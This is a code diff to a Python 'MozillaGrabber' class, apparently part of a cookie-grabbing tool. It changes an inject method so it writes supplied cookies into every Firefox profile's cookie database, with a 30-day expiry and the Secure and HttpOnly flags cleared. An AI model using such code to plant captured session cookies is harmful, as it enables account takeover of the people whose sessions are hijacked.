@@ -66,20 +66,20 @@ class MozillaGrabber():
   def getBrowserName(self):
     return "Mozilla Firefox"
 
-  def inject(self, cookies, user, profile):
-    path=self.cookieTrail%(user,profile)
+  def inject(self, cookies, user, profile=None):
+    profiles = [profile] if profile is not None else self.getProfiles(user)
     if type(cookies)!=list:
       cookies=[cookies]
-    moz=sqlite3.connect(path)
-
-    for c in cookies:
-      moz.execute('''INSERT OR REPLACE INTO moz_cookies
-                    (baseDomain, host,  name, value, path, expiry,lastAccessed,creationTime,isSecure, isHTTPOnly)
-                     VALUES(:dom,:host,:name,:val,:path,:exp,:la,:ct,:is,:http)''',
-                     {'dom':c.domain,    'host':c.host,       'name': c.name,  'val':c.value,   'path':'/', 'exp':int(time.time()*1000000)+2592000,
-                      'la':  c.lastUsed, 'ct':c.creationTime, 'is':0,          'http':0})
-    moz.commit()
-    moz.close()
+    for p in profiles:
+      moz=sqlite3.connect(self.cookieTrail%(user,p))
+      for c in cookies:
+        moz.execute('''INSERT OR REPLACE INTO moz_cookies
+                      (baseDomain, host,  name, value, path, expiry,lastAccessed,creationTime,isSecure, isHTTPOnly)
+                       VALUES(:dom,:host,:name,:val,:path,:exp,:la,:ct,:is,:http)''',
+                       {'dom':c.domain,    'host':c.host,       'name': c.name,  'val':c.value,   'path':'/', 'exp':int(time.time()*1000000)+2592000,
+                        'la':  c.lastUsed, 'ct':c.creationTime, 'is':0,          'http':0})
+      moz.commit()
+      moz.close()
 
 
 
